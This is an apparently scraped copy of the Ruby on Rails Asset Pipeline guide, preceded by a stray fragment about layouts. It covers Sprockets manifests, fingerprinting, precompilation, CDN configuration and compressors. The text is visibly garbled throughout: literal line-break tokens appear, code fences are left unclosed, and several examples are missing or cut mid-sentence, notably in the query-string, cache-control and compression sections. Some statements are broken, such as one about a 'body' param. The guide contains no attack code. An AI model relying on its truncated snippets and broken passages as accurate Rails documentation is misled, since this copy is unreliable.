One can use the `ActionView::render` method via `render template: 'layouts/news'` to base a new layout on the News layout. 
If you are sure you will not subtemplate the `News` layout, you can replace the `content_for?(:news_content) ? yield(:news_content) : yield` with simply `yield`.
The Asset Pipeline
==================
This guide covers the asset pipeline.
* What the asset pipeline is and what it does.
* How to properly organize your application assets.
* The benefits of the asset pipeline.
* How to add a pre-processor to the pipeline.
* How to package assets with a gem.
What is the Asset Pipeline?
The asset pipeline provides a framework to concatenate and minify or compress<n>JavaScript and CSS assets. 
It also adds the ability to write these assets in<n>other languages and pre-processors such as CoffeeScript, Sass and ERB.
The asset pipeline is technically no longer a core feature of Rails 4, it has<n>been extracted out of the framework into the<n>[sprockets-rails](https://github.com/rails/sprockets-rails) gem.
The asset pipeline is enabled by default.
You can disable the asset pipeline while creating a new application by<n>passing the `--skip-sprockets` option.
rails new appname --skip-sprockets
Rails 4 automatically adds the `sass-rails`, `coffee-rails` and `uglifier`<n>gems to your Gemfile, which are used by Sprockets for asset compression:
gem 'sass-rails'
gem 'uglifier'
gem 'coffee-rails'
Using the `--skip-sprockets` option will prevent Rails 4 from adding<n>`sass-rails` and `uglifier` to Gemfile, so if you later want to enable<n>the asset pipeline you will have to add those gems to your Gemfile. 
Also,<n>creating an application with the `--skip-sprockets` option will generate<n>a slightly different `config/application.rb` file, with a require statement<n>for the sprockets railtie that is commented-out. 
You will have to remove<n>the comment operator on that line to later enable the asset pipeline:
# require "sprockets/railtie"
To set asset compression methods, set the appropriate configuration options<n>in `production.rb` - `config.assets.css_compressor` for your CSS and<n>`config.assets.js_compressor` for your JavaScript:
config.assets.css_compressor = :yui
NOTE: The `sass-rails` gem is automatically used for CSS compression if included<n>in Gemfile and no `config.assets.css_compressor` option is set.
### Main Features
The first feature of the pipeline is to concatenate assets, which can reduce the<n>number of requests that a browser makes to render a web page. 
Web browsers are<n>limited in the number of requests that they can make in parallel, so fewer<n>requests can mean faster loading for your application.
Sprockets concatenates all JavaScript files into one master `.js` file and all<n>CSS files into one master `.css` file. 
As you'll learn later in this guide, you<n>can customize this strategy to group files any way you like. 
In production,<n>Rails inserts an MD5 fingerprint into each filename so that the file is cached<n>by the web browser. 
You can invalidate the cache by altering this fingerprint,<n>which happens automatically whenever you change the file contents.
The second feature of the asset pipeline is asset minification or compression.<n>
For CSS files, this is done by removing whitespace and comments. 
For JavaScript,<n>more complex processes can be applied. 
You can choose from a set of built in<n>options or specify your own.
The third feature of the asset pipeline is it allows coding assets via a<n>higher-level language, with precompilation down to the actual assets. 
Supported<n>languages include Sass for CSS, CoffeeScript for JavaScript, and ERB for both by<n>default.
### What is Fingerprinting and Why Should I Care?
Fingerprinting is a technique that makes the name of a file dependent on the<n>contents of the file. 
When the file contents change, the filename is also<n>changed. 
For content that is static or infrequently changed, this provides an<n>easy way to tell whether two versions of a file are identical, even across<n>different servers or deployment dates.
When a filename is unique and based on its content, HTTP headers can be set to<n>encourage caches everywhere (whether at CDNs, at ISPs, in networking equipment,<n>or in web browsers) to keep their own copy of the content. 
When the content is<n>updated, the fingerprint will change. 
This will cause the remote clients to<n>request a new copy of the content. 
This is generally known as _cache busting_.
The technique sprockets uses for fingerprinting is to insert a hash of the<n>content into the name, usually at the end. 
For example a CSS file `global.css`
global-908e25f4bf641868d8683022a5b62f54.css
This is the strategy adopted by the Rails asset pipeline.
Rails' old strategy was to append a date-based query string to every asset linked<n>with a built-in helper. 
In the source the generated code looked like this:
The query string strategy has several disadvantages:
**Not all caches will reliably cache content where the filename only differs by<n>query parameters**
    [Steve Souders recommends](http://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/),<n> "...avoiding a querystring for cacheable resources". 
He found that in this<n>case 5-20% of requests will not be cached. 
Query strings in particular do not<n>work at all with some CDNs for cache invalidation.
**The file name can change between nodes in multi-server environments.
    The default query string in Rails 2.x is based on the modification time of<n>the files. 
When assets are deployed to a cluster, there is no guarantee that the<n>timestamps will be the same, resulting in different values being used depending<n>on which server handles the request.
**Too much cache invalidation**
    When static assets are deployed with each new release of code, the mtime<n>(time of last modification) of _all_ these files changes, forcing all remote<n>clients to fetch them again, even when the content of those assets has not changed.
Fingerprinting fixes these problems by avoiding query strings, and by ensuring<n>that filenames are consistent based on their content.
Fingerprinting is enabled by default for production and disabled for all other<n>environments. 
You can enable or disable it in your configuration through the<n>`config.assets.digest` option.
More reading:
* [Optimize caching](http://code.google.com/speed/page-speed/docs/caching.html)
* [Revving Filenames: don't use querystring](http://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/)
How to Use the Asset Pipeline
In previous versions of Rails, all assets were located in subdirectories of<n>`public` such as `images`, `javascripts` and `stylesheets`. 
With the asset<n>pipeline, the preferred location for these assets is now the `app/assets`<n>directory. 
Files in this directory are served by the Sprockets middleware.
Assets can still be placed in the `public` hierarchy. 
You should use `app/assets` for<n>files that must undergo some pre-processing before they are served.
In production, Rails precompiles these files to `public/assets` by default. 
The<n>precompiled copies are then served as static assets by the web server. 
The files<n>in `app/assets` are never served directly in production.
### Controller Specific Assets
When you generate a scaffold or a controller, Rails also generates a JavaScript<n>file (or CoffeeScript file if the `coffee-rails` gem is in the `Gemfile`) and a<n>Cascading Style Sheet file (or SCSS file if `sass-rails` is in the `Gemfile`)<n>for that controller. 
Additionally, when generating a scaffold, Rails generates<n>the file scaffolds.css (or scaffolds.css.scss if `sass-rails` is in the<n>`Gemfile`.)
For example, if you generate a `ProjectsController`, Rails will also add a new<n>file at `app/assets/javascripts/projects.js.coffee` and another at<n>`app/assets/stylesheets/projects.css.scss`. 
By default these files will be ready<n>to use by your application immediately using the `require_tree` directive. 
See<n>[Manifest Files and Directives](#manifest-files-and-directives) for more details<n>on require_tree.
You can also opt to include controller specific stylesheets and JavaScript files<n>only in their respective controllers using the following:
`<%= javascript_include_tag params[:controller] %>` or `<%= stylesheet_link_tag<n>params[:controller] %>`
When doing this, ensure you are not using the `require_tree` directive, as that<n>will result in your assets being included more than once.
WARNING: When using asset precompilation, you will need to ensure that your<n>controller assets will be precompiled when loading them on a per page basis. 
By<n>default .coffee and .scss files will not be precompiled on their own. 
See<n>[Precompiling Assets](#precompiling-assets) for more information on how<n>precompiling works.
NOTE: You must have an ExecJS supported runtime in order to use CoffeeScript.<n>
If you are using Mac OS X or Windows, you have a JavaScript runtime installed in<n>your operating system. 
You can also disable generation of controller specific asset files by adding the<n>following to your `config/application.rb` configuration:
  config.generators do |g|
    g.assets false
### Asset Organization
Pipeline assets can be placed inside an application in one of three locations:<n>`app/assets`, `lib/assets` or `vendor/assets`.
* `app/assets` is for assets that are owned by the application, such as custom<n>images, JavaScript files or stylesheets.
* `lib/assets` is for your own libraries' code that doesn't really fit into the<n>scope of the application or those libraries which are shared across applications.
* `vendor/assets` is for assets that are owned by outside entities, such as<n>code for JavaScript plugins and CSS frameworks.
WARNING: If you are upgrading from Rails 3, please take into account that assets<n>under `lib/assets` or `vendor/assets` are available for inclusion via the<n>application manifests but no longer part of the precompile array. 
See<n>[Precompiling Assets](#precompiling-assets) for guidance.
#### Search Paths
When a file is referenced from a manifest or a helper, Sprockets searches the<n>three default asset locations for it.
The default locations are: the `images`, `javascripts` and `stylesheets`<n>directories under the `app/assets` folder, but these subdirectories<n>are not special - any path under `assets/*` will be searched.
For example, these files:
app/assets/javascripts/home.js
lib/assets/javascripts/moovinator.js
vendor/assets/javascripts/slider.js
vendor/assets/somepackage/phonebox.js
would be referenced in a manifest like this:
```js
//= require home
//= require moovinator
//= require slider
//= require phonebox
Assets inside subdirectories can also be accessed.
app/assets/javascripts/sub/something.js
is referenced as:
//= require sub/something
You can view the search path by inspecting<n>`Rails.application.config.assets.paths` in the Rails console.
Besides the standard `assets/*` paths, additional (fully qualified) paths can be<n>added to the pipeline in `config/application.rb`. 
For example:
config.assets.paths << Rails.root.join("lib", "videoplayer", "flash")
Paths are traversed in the order they occur in the search path. 
By default,<n>this means the files in `app/assets` take precedence, and will mask<n>corresponding paths in `lib` and `vendor`.
#### Using Index Files
Sprockets uses files named `index` (with the relevant extensions) for a special<n>purpose.
For example, if you have a jQuery library with many modules, which is stored in<n>`lib/assets/javascripts/library_name`, the file `lib/assets/javascripts/library_name/index.js` serves as<n>the manifest for all files in this library. 
This file could include a list of<n>all the required files in order, or a simple `require_tree` directive.
The library as a whole can be accessed in the application manifest like so:
//= require library_name
This simplifies maintenance and keeps things clean by allowing related code to<n>be grouped before inclusion elsewhere.
### Coding Links to Assets
Sprockets does not add any new methods to access your assets - you still use the<n>familiar `javascript_include_tag` and `stylesheet_link_tag`:
<%= stylesheet_link_tag "application", media: "all" %>
<%= javascript_include_tag "application" %>
If using the turbolinks gem, which is included by default in Rails 4, then<n>include the 'data-turbolinks-track' option which causes turbolinks to check if<n>an asset has been updated and if so loads it into the page:
<%= stylesheet_link_tag "application", media: "all", "data-turbolinks-track" => true %>
<%= javascript_include_tag "application", "data-turbolinks-track" => true %>
In regular views you can access images in the `public/assets/images` directory<n>like this:
<%= image_tag "rails.png" %>
Provided that the pipeline is enabled within your application (and not disabled<n>in the current environment context), this file is served by Sprockets. 
If a file<n>exists at `public/assets/rails.png` it is served by the web server.
Alternatively, a request for a file with an MD5 hash such as<n>`public/assets/rails-af27b6a414e6da00003503148be9b409.png` is treated the same<n>way. 
How these hashes are generated is covered in the [In<n>Production](#in-production) section later on in this guide.
Sprockets will also look through the paths specified in `config.assets.paths`,<n>which includes the standard application paths and any paths added by Rails<n>engines.
Images can also be organized into subdirectories if required, and then can be<n>accessed by specifying the directory's name in the tag:
WARNING: If you're precompiling your assets (see [In Production](#in-production)<n>below), linking to an asset that does not exist will raise an exception in the<n>calling page. 
This includes linking to a blank string. 
As such, be careful using<n>`image_tag` and the other helpers with user-supplied data.
#### CSS and ERB
The asset pipeline automatically evaluates ERB. 
This means if you add an<n>`erb` extension to a CSS asset (for example, `application.css.erb`), then<n>helpers like `asset_path` are available in your CSS rules:
```css
.class { background-image: url(<%= asset_path 'image.png' %>) }
This writes the path to the particular asset being referenced. 
In this example,<n>it would make sense to have an image in one of the asset load paths, such as<n>`app/assets/images/image.png`, which would be referenced here. 
If this image is<n>already available in `public/assets` as a fingerprinted file, then that path is<n>referenced.
If you want to use a [data URI](http://en.wikipedia.org/wiki/Data_URI_scheme) -<n>a method of embedding the image data directly into the CSS file - you can use<n>the `asset_data_uri` helper.
#logo { background: url(<%= asset_data_uri 'logo.png' %>) }
This inserts a correctly-formatted data URI into the CSS source.
Note that the closing tag cannot be of the style `-%>`.
#### CSS and Sass
When using the asset pipeline, paths to assets must be re-written and<n>`sass-rails` provides `-url` and `-path` helpers (hyphenated in Sass,<n>underscored in Ruby) for the following asset classes: image, font, video, audio,<n>JavaScript and stylesheet.
* `image-url("rails.png")` becomes `url(/assets/rails.png)`
* `image-path("rails.png")` becomes `"/assets/rails.png"`.
The more generic form can also be used:
* `asset-url("rails.png")` becomes `url(/assets/rails.png)`
* `asset-path("rails.png")` becomes `"/assets/rails.png"`
#### JavaScript/CoffeeScript and ERB
If you add an `erb` extension to a JavaScript asset, making it something such as<n>`application.js.erb`, you can then use the `asset_path` helper in your<n>JavaScript code:
$('#logo').attr({ src: "<%= asset_path('logo.png') %>" });
This writes the path to the particular asset being referenced.<n><n>
$('#logo').attr src: "<%= asset_path('logo.png') %>"
### Manifest Files and Directives
Sprockets uses manifest files to determine which assets to include and serve.<n>
These manifest files contain _directives_ - instructions that tell Sprockets<n>which files to require in order to build a single CSS or JavaScript file. 
By serving<n>one file rather than many, the load time of pages can be greatly reduced because<n>the browser makes fewer requests. 
Compression also reduces file size, enabling<n>the browser to download them faster.
For example, a new Rails 4 application includes a default<n>`app/assets/javascripts/application.js` file containing the following lines:
// ...
//= require jquery
//= require jquery_ujs
//= require_tree .
In JavaScript files, Sprockets directives begin with `//=`. 
In the above case,<n>the file is using the `require` and the `require_tree` directives. 
The `require`<n>directive is used to tell Sprockets the files you wish to require. 
Here, you are<n>requiring the files `jquery.js` and `jquery_ujs.js` that are available somewhere<n>in the search path for Sprockets. 
You need not supply the extensions explicitly.<n>
Sprockets assumes you are requiring a `.js` file when done from within a `.js`<n>file.
The `require_tree` directive tells Sprockets to recursively include _all_<n>JavaScript files in the specified directory into the output. 
These paths must be<n>specified relative to the manifest file. 
You can also use the<n>`require_directory` directive which includes all JavaScript files only in the<n>directory specified, without recursion.
Directives are processed top to bottom, but the order in which files are<n>included by `require_tree` is unspecified. 
You should not rely on any particular<n>order among those. 
If you need to ensure some particular JavaScript ends up<n>above some other in the concatenated file, require the prerequisite file first<n>in the manifest. 
Note that the family of `require` directives prevents files<n>from being included twice in the output.
Rails also creates a default `app/assets/stylesheets/application.css` file<n>which contains these lines:
/* ...
*= require_self
*= require_tree .
Rails 4 creates both `app/assets/javascripts/application.js` and<n>`app/assets/stylesheets/application.css` regardless of whether the<n>--skip-sprockets option is used when creating a new rails application. 
This is<n>so you can easily add asset pipelining later if you like.
The directives that work in JavaScript files also work in stylesheets<n>(though obviously including stylesheets rather than JavaScript files). 
The<n>`require_tree` directive in a CSS manifest works the same way as the JavaScript<n>one, requiring all stylesheets from the current directory.
In this example, `require_self` is used. 
This puts the CSS contained within the<n>file (if any) at the precise location of the `require_self` call.
NOTE. If you want to use multiple Sass files, you should generally use the [Sass `@import` rule](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#import)<n>instead of these Sprockets directives. 
When using Sprockets directives, Sass files exist within<n>their own scope, making variables or mixins only available within the document they were defined in.
You can do file globbing as well using `@import "*"`, and `@import "**/*"` to add the whole tree which is equivalent to how `require_tree` works. 
Check the [sass-rails documentation](https://github.com/rails/sass-rails#features) for more info and important caveats.
You can have as many manifest files as you need. 
For example, the `admin.css`<n>and `admin.js` manifest could contain the JS and CSS files that are used for the<n>admin section of an application.
The same remarks about ordering made above apply. 
In particular, you can specify<n>individual files and they are compiled in the order specified. 
For example, you<n>might concatenate three CSS files together this way:
*= require reset
*= require layout
*= require chrome
### Preprocessing
The file extensions used on an asset determine what preprocessing is applied.<n>
When a controller or a scaffold is generated with the default Rails gemset, a<n>CoffeeScript file and a SCSS file are generated in place of a regular JavaScript<n>and CSS file. 
The example used before was a controller called "projects", which<n>generated an `app/assets/javascripts/projects.js.coffee` and an<n>`app/assets/stylesheets/projects.css.scss` file.
In development mode, or if the asset pipeline is disabled, when these files are<n>requested they are processed by the processors provided by the `coffee-script`<n>and `sass` gems and then sent back to the browser as JavaScript and CSS<n>respectively. 
When asset pipelining is enabled, these files are preprocessed and<n>placed in the `public/assets` directory for serving by either the Rails app or<n>web server.
Additional layers of preprocessing can be requested by adding other extensions,<n>where each extension is processed in a right-to-left manner. 
These should be<n>used in the order the processing should be applied. 
For example, a stylesheet<n>called `app/assets/stylesheets/projects.css.scss.erb` is first processed as ERB,<n>then SCSS, and finally served as CSS. The same applies to a JavaScript file -<n>`app/assets/javascripts/projects.js.coffee.erb` is processed as ERB, then<n>CoffeeScript, and served as JavaScript.
Keep in mind the order of these preprocessors is important. 
For example, if<n>you called your JavaScript file `app/assets/javascripts/projects.js.erb.coffee`<n>then it would be processed with the CoffeeScript interpreter first, which<n>wouldn't understand ERB and therefore you would run into problems.
In Development
In development mode, assets are served as separate files in the order they are<n>specified in the manifest file.
This manifest `app/assets/javascripts/application.js`:
//= require core
//= require projects
//= require tickets
would generate this HTML:
<script src="/assets/core.js?
<script src="/assets/projects.js?
<script src="/assets/tickets.js?
The `body` param is required by Sprockets.
### Runtime Error Checking
By default the asset pipeline will check for potential errors in development mode during<n>runtime. 
To disable this behavior you can set:
config.assets.raise_runtime_errors = false
When this option is true, the asset pipeline will check if all the assets loaded<n>in your application are included in the `config.assets.precompile` list.<n>
If `config.assets.digest` is also true, the asset pipeline will require that<n>all requests for assets include digests.
### Turning Digests Off
You can turn off digests by updating `config/environments/development.rb` to<n>include:
config.assets.digest = false
When this option is true, digests will be generated for asset URLs.
### Turning Debugging Off
You can turn off debug mode by updating `config/environments/development.rb` to<n>include:
config.assets.debug = false
When debug mode is off, Sprockets concatenates and runs the necessary<n>preprocessors on all files. 
With debug mode turned off the manifest above would<n>generate instead:
<script src="/assets/application.js"></script>
Assets are compiled and cached on the first request after the server is started.<n>
Sprockets sets a `must-revalidate` Cache-Control HTTP header to reduce request<n>overhead on subsequent requests - on these the browser gets a 304 (Not Modified)<n>response.
If any of the files in the manifest have changed between requests, the server<n>responds with a new compiled file.
Debug mode can also be enabled in Rails helper methods:
<%= stylesheet_link_tag "application", debug: true %>
<%= javascript_include_tag "application", debug: true %>
The `:debug` option is redundant if debug mode is already on.
In Production
In the production environment Sprockets uses the fingerprinting scheme outlined<n>above. 
By default Rails assumes assets have been precompiled and will be<n>served as static assets by your web server.
During the precompilation phase an MD5 is generated from the contents of the<n>compiled files, and inserted into the filenames as they are written to disc.<n>
These fingerprinted names are used by the Rails helpers in place of the manifest<n>name.
For example this:
<%= stylesheet_link_tag "application" %>
generates something like this:
<script src="/assets/application-908e25f4bf641868d8683022a5b62f54.js"></script>
<link href="/assets/application-4dd5b109ee3439da54f5bdfd78a80473.css" media="screen"<n>rel="stylesheet" />
Note: with the Asset Pipeline the :cache and :concat options aren't used<n>anymore, delete these options from the `javascript_include_tag` and<n>`stylesheet_link_tag`.
The fingerprinting behavior is controlled by the `config.assets.digest`<n>initialization option (which defaults to `true` for production and `false` for<n>everything else).
NOTE: Under normal circumstances the default `config.assets.digest` option<n>should not be changed. 
If there are no digests in the filenames, and far-future<n>headers are set, remote clients will never know to refetch the files when their<n>content changes.
### Precompiling Assets
Compiled assets are written to the location specified in `config.assets.prefix`.<n>
By default, this is the `/assets` directory.
See the next section for<n>information on compiling locally.
Add the following line to `Capfile`:
load 'deploy/assets'
This links the folder specified in `config.assets.prefix` to `shared/assets`.
If you already use this shared folder you'll need to write your own deployment<n>task.
It is important that this folder is shared between deployments so that remotely<n>cached pages referencing the old compiled assets still work for the life of<n>the cached page.
The default matcher for compiling files includes `application.js`,<n>`application.css` and all non-JS/CSS files (this will include all image assets<n>automatically) from `app/assets` folders including your gems:
[ Proc.new { |filename, path| path =~ /app\/assets/ && !
%w(.js .css).include?(
File.extname(filename)) },
/application.(css|js)$/ ]
NOTE: The matcher (and other members of the precompile array; see below) is<n>applied to final compiled file names. 
This means anything that compiles to<n>JS/CSS is excluded, as well as raw JS/CSS files; for example, `.coffee` and<n>`.scss` files are **not** automatically included as they compile to JS/CSS.
If you have other manifests or individual stylesheets and JavaScript files to<n>include, you can add them to the `precompile` array in `config/initializers/assets.rb`:
Rails.application.config.assets.precompile += ['admin.js', 'admin.css', 'swfObject.js']
NOTE. Always specify an expected compiled filename that ends with .js or .css,<n>even if you want to add Sass or CoffeeScript files to the precompile array.
This is used by the Rails<n>helper methods to avoid handing the mapping requests back to Sprockets. 
A<n>typical manifest file looks like:
{"files":{"application-723d1be6cc741a3aabb1cec24276d681.js":{"logical_path":"application.js","mtime":"2013-07-26T22:55:03-07:00","size":302506,
"digest":"723d1be6cc741a3aabb1cec24276d681"},"application-12b3c7dd74d2e9df37e7cbb1efa76a6d.css":{"logical_path":"application.css","mtime":"2013-07-26T22:54:54-07:00","size":1560,
"digest":"12b3c7dd74d2e9df37e7cbb1efa76a6d"},"application-1c5752789588ac18d7e1a50b1f0fd4c2.css":{"logical_path":"application.css","mtime":"2013-07-26T22:56:17-07:00","size":1591,
"digest":"1c5752789588ac18d7e1a50b1f0fd4c2"},"favicon-a9c641bf2b81f0476e876f7c5e375969.ico":{"logical_path":"favicon.ico","mtime":"2013-07-26T23:00:10-07:00","size":1406,
"digest":"a9c641bf2b81f0476e876f7c5e375969"},"my_image-231a680f23887d9dd70710ea5efd3c62.png":{"logical_path":"my_image.png","mtime":"2013-07-26T23:00:27-07:00","size":6646,
"digest":"231a680f23887d9dd70710ea5efd3c62"}},"assets":{"application.js":
"application-723d1be6cc741a3aabb1cec24276d681.js","application.css":
"application-1c5752789588ac18d7e1a50b1f0fd4c2.css",
"favicon.ico":"favicona9c641bf2b81f0476e876f7c5e375969.ico","my_image.png":
"my_image-231a680f23887d9dd70710ea5efd3c62.png"}}
The default location for the manifest is the root of the location specified in<n>`config.assets.prefix` ('/assets' by default).
NOTE: If there are missing precompiled files in production you will get an<n>`Sprockets::Helpers::RailsHelper::AssetPaths::AssetNotPrecompiledError`<n>exception indicating the name of the missing file(s).
#### Far-future Expires Header
Precompiled assets exist on the file system and are served directly by your web<n>server. 
They do not have far-future headers by default, so to get the benefit of<n>fingerprinting you'll have to update your server configuration to add those<n>headers.
For Apache:
```apache
# The Expires* directives requires the Apache module
# `mod_expires` to be enabled.
<Location /assets/>
  # Use of ETag is discouraged when Last-Modified is present
  Header unset ETag
  FileETag None
  # RFC says only cache for 1 year
  ExpiresActive On
  ExpiresDefault "access plus 1 year"
For NGINX:
```nginx
location ~ ^/assets/ {
  expires 1y;
  add_header Cache-Control public;
  add_header ETag "";
  break;
### Local Precompilation
There are several reasons why you might want to precompile your assets locally.<n>
Among them are:
* You may not have write access to your production file system.
* You may be deploying to more than one server, and want to avoid<n>duplication of work.
* You may be doing frequent deploys that do not include asset changes.
Local compilation allows you to commit the compiled files into source control,<n>and deploy as normal.
There are three caveats:
* You must not run the Capistrano deployment task that precompiles assets.
* You must ensure any necessary compressors or minifiers are<n>available on your development system.
* You must change the following application configuration setting:
In `config/environments/development.rb`, place the following line:
config.assets.prefix = "/dev-assets"
The `prefix` change makes Sprockets use a different URL for serving assets in<n>development mode, and pass all requests to Sprockets. 
The prefix is still set to<n>`/assets` in the production environment. 
Without this change, the application<n>would serve the precompiled assets from `/assets` in development, and you would<n>not see any local changes until you compile assets again.
In practice, this will allow you to precompile locally, have those files in your<n>working tree, and commit those files to source control when needed.  
Development<n>mode will work as expected.
### Live Compilation
In some circumstances you may wish to use live compilation. 
In this mode all<n>requests for assets in the pipeline are handled by Sprockets directly.
To enable this option set:
config.assets.compile = true
On the first request the assets are compiled and cached as outlined in<n>development above, and the manifest names used in the helpers are altered to<n>include the MD5 hash.
Sprockets also sets the `Cache-Control` HTTP header to `max-age=31536000`. 
This<n>signals all caches between your server and the client browser that this content<n>(the file served) can be cached for 1 year. 
The effect of this is to reduce the<n>number of requests for this asset from your server; the asset has a good chance<n>of being in the local browser cache or some intermediate cache.
This mode uses more memory, performs more poorly than the default and is not<n>recommended.
If you are deploying a production application to a system without any<n>pre-existing JavaScript runtimes, you may want to add one to your Gemfile:
group :production do
  gem 'therubyracer'
### CDNs
CDN stands for [Content Delivery<n>Network](http://en.wikipedia.org/wiki/Content_delivery_network), they are<n>primarily designed to cache assets all over the world so that when a browser<n>requests the asset, a cached copy will be geographically close to that browser.<n>
If you are serving assets directly from your Rails server in production, the<n>best practice is to use a CDN in front of your application.
A common pattern for using a CDN is to set your production application as the<n>"origin" server. 
This means when a browser requests an asset from the CDN and<n>there is a cache miss, it will grab the file from your server on the fly and<n>then cache it. 
The next request to the<n>CDN that comes in to the same URL will hit the cached copy. 
When the CDN can<n>serve an asset directly the request never touches your Rails server. 
Since the<n>assets from a CDN are geographically closer to the browser, the request is<n>faster, and since your server doesn't need to spend time serving assets, it can<n>focus on serving application code as fast as possible.
#### Set up a CDN to Serve Static Assets
To set up your CDN you have to have your application running in production on<n>the internet at a publically available URL, for example `example.com`. 
Next<n>you'll need to sign up for a CDN service from a cloud hosting provider. 
When you<n>do this you need to configure the "origin" of the CDN to point back at your<n>website `example.com`, check your provider for documentation on configuring the<n>origin server.
The CDN you provisioned should give you a custom subdomain for your application<n>such as `mycdnsubdomain.fictional-cdn.com` (note fictional-cdn.com is not a<n>valid CDN provider at the time of this writing). 
Now that you have configured<n>your CDN server, you need to tell browsers to use your CDN to grab assets<n>instead of your Rails server directly. 
You can do this by configuring Rails to<n>set your CDN as the asset host instead of using a relative path. 
To set your<n>asset host in Rails, you need to set `config.action_controller.asset_host` in<n>`config/production.rb`:
config.action_controller.asset_host = 'mycdnsubdomain.fictional-cdn.com'
NOTE: You only need to provide the "host", this is the subdomain and root<n>domain, you do not need to specify a protocol or "scheme" such as `http://` or<n>`https://`. 
When a web page is requested, the protocol in the link to your asset<n>that is generated will match how the webpage is accessed by default.
You can also set this value through an [environment<n>variable](http://en.wikipedia.org/wiki/Environment_variable) to make running a<n>staging copy of your site easier:
config.action_controller.asset_host = ENV['CDN_HOST']
Once you have configured your server and your CDN when you serve a webpage that<n>has an asset:
<%= asset_path('smile.png') %>
Instead of returning a path such as `/assets/smile.png` (digests are left out<n>for readability). 
The URL generated will have the full path to your CDN.
http://mycdnsubdomain.fictional-cdn.com/assets/smile.png
If the CDN does not have a copy it<n>will try to find it a the "origin" `example.com/assets/smile.png` and then store<n>it for future use.
If you want to serve only some assets from your CDN, you can use custom `:host`<n>option your asset helper, which overwrites value set in<n>`config.action_controller.asset_host`.
<%= asset_path 'image.png', host: 'mycdnsubdomain.fictional-cdn.com' %>
#### Customize CDN Caching Behavior
A CDN works by caching content. 
If the CDN has stale or bad content, then it is<n>hurting rather than helping your application. 
The purpose of this section is to<n>describe general caching behavior of most CDNs, your specific provider may<n>behave slightly differently.
##### CDN Request Caching
While a CDN is described as being good for caching assets, in reality caches the<n>entire request. 
The<n>most important one being `Cache-Control` which tells the CDN (and web browsers)<n>how to cache contents. 
This means that if someone requests an asset that does<n>not exist `/assets/i-dont-exist.png` and your Rails application returns a 404,<n>then your CDN will likely cache the 404 page if a valid `Cache-Control` header<n>is present.
##### CDN Header Debugging
One way to check the headers are cached properly in your CDN is by using [curl](<n>http://explainshell.com/explain?cmd=curl+-I+http%3A%2F%2Fwww.example.com). 
You<n>can request the headers from both your server and your CDN to verify they are<n>the same:
HTTP/1.1 200 OK<n>Server: Cowboy
Date: Sun, 24 Aug 2014 20:27:50 GMT
Connection: keep-alive
Last-Modified: Thu, 08 May 2014 01:24:14 GMT<n>Content-Type: text/css
Cache-Control: public, max-age=2592000
Content-Length: 126560
Via: 1.1 vegur
Versus the CDN copy.
HTTP/1.1 200 OK Server: Cowboy
Content-Type: text/css
Cache-Control:<n>public, max-age=2592000
Accept-Ranges:
bytes
Date: Sun, 24 Aug 2014 20:28:45 GMT
Via: 1.1 varnish
Age: 885814
X-Served-By: cache-dfw1828-DFW
X-Cache: HIT
X-Cache-Hits:
X-Timer: S1408912125.211638212,VS0,VE0
Check your CDN documentation for any additional information they may provide<n>such as `X-Cache` or for any additional headers they may add.
##### CDNs and the Cache-Control Header
The [cache control<n>header](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.9) is a W3C<n>specification that describes how a request can be cached. 
When no CDN is used, a<n>browser will use this information to cache contents. 
This is very helpful for<n>assets that are not modified so that a browser does not need to re-download a<n>website's CSS or javascript on every request. 
Generally we want our Rails server<n>to tell our CDN (and browser) that the asset is "public", that means any cache<n>can store the request. 
Also we commonly want to set `max-age` which is how long<n>the cache will store the object before invalidating the cache. 
The `max-age`<n>value is set to seconds with a maximum possible value of `31536000` which is one<n>year. 
You can do this in your rails application by setting
For<n>example
The [YUI CSS<n>compressor](http://yui.github.io/yuicompressor/css.html) provides<n>minification.
If you are using Mac OS X or<n>Windows you have a JavaScript runtime installed in your operating system.
NOTE: The `config.assets.compress` initialization option is no longer used in<n>Rails 4 to enable either CSS or JavaScript compression. 
Setting it will have no<n>effect on the application. 
Instead, setting `config.assets.css_compressor` and<n>`config.assets.js_compressor` will control compression of CSS and JavaScript<n>assets.
### Using Your Own Compressor
The compressor config settings for CSS and JavaScript also take any object.<n>
This object must have a `compress` method that takes a string as the sole<n>argument and it must return a string.
class Transformer
  def compress(string)
    do_something_returning_a_string(string)
To enable this, pass a new object to the config option in `application.rb`:
config.assets.css_compressor = Transformer.new
### Changing the _assets_ Path
The public path that Sprockets uses by default is `/assets`.
This can be changed to something else:
config.assets.prefix = "/some_other_path"
This is a handy option if you are updating an older project that didn't use the<n>asset pipeline and already uses this path or you wish to use this path for<n>a new resource.
### X-Sendfile Headers
The X-Sendfile header is a directive to the web server to ignore the response<n>from the application, and instead serve a specified file from disk. 
This option<n>is off by default, but can be enabled if your server supports it. 
When enabled,<n>this passes responsibility for serving the file to the web server, which is<n>faster. 
Have a look at [send_file](http://api.rubyonrails.org/classes/ActionController/DataStreaming.html#method-i-send_file)<n>on how to use this feature.
Apache and NGINX support this option, which can be enabled in<n>`config/environments/production.rb`:
# config.action_dispatch.x_sendfile_header = "X-Sendfile" # for Apache
# config.action_dispatch.x_sendfile_header = 'X-Accel-Redirect' # for NGINX
WARNING: If you are upgrading an existing application and intend to use this<n>option, take care to paste this configuration option only into `production.rb`<n>and any other environments you define with production behavior (not<n>`application.rb`).
TIP: For further details have a look at the docs of your production web server:
- [Apache](https://tn123.org/mod_xsendfile/)
- [NGINX](http://wiki.nginx.org/XSendfile)
Assets Cache Store
The default Rails cache store will be used by Sprockets to cache assets in<n>development and production. 
This can be changed by setting<n>`config.assets.cache_store`:
config.assets.cache_store = :memory_store
The options accepted by the assets cache store are the same as the application's
config.assets.cache_store = :memory_store, { size: 32.megabytes }
To disable the assets cache store:
config.assets.configure do |env|
  env.cache = ActiveSupport::Cache.lookup_store(:null_store)
Adding Assets to Your Gems
Assets can also come from external sources in the form of gems.
A good example of this is the `jquery-rails` gem which comes with Rails as the<n>standard JavaScript library gem. 
This gem contains an engine class which<n>inherits from `Rails::Engine`. 
By doing this, Rails is informed that the<n>directory for this gem may contain assets and the `app/assets`, `lib/assets` and<n>`vendor/assets` directories of this engine are added to the search path of<n>Sprockets.
Making Your Library or Gem a Pre-Processor
------------------------------------------
As Sprockets uses [Tilt](https://github.com/rtomayko/tilt) as a generic<n>interface to different templating engines, your gem should just implement the<n>Tilt template protocol. 
